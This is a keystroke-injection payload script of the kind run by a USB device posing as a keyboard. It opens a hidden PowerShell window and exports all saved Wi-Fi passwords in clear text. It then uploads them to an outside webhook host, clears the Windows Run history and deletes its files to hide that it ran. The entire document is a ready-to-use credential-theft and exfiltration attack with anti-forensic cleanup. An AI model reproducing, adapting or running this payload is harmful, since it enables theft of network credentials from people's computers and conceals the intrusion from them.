REM This payload quickly exfiltrates all wifi data it can obtain, and sends it to the host. This script also stays completely hidden and deletes all evidence it had ever ran in the run history.

DELAY 3000
GUI R
DELAY 100
STRING powershell -noexit -W hidden ; cd %tmp% ; netsh wlan export profile key=clear ; Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS ; Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS ; Remove-ItemProperty -Path ‘HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU’ -Name ‘*’ -ErrorAction SilentlyContinue ; del Wi* /s /f /q
ENTER
DELAY 1000
EXIT
